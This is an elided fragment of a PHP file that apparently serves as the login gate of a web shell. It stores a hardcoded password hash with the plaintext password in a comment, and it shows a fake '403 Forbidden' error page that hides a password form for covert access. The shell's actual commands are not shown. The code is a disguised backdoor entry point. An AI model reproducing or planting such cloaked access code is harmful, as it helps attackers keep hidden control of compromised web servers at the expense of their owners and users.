<?php
session_start();
$password_hash = "9ae5db3f1ff8723d934cfe376e633647"; // "!Ml3b3tm4s"
...
<h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2><p>Access to this resource on the server is denied!</p></body></html>
        <?php
    } else {
        ?>
        <!DOCTYPE html>
        ...
        <div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
            <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2><p>Access to this resource on the server is denied!</p>
            <form method="POST">
            <style>
            input[type="password"] {
                    padding: 10px;
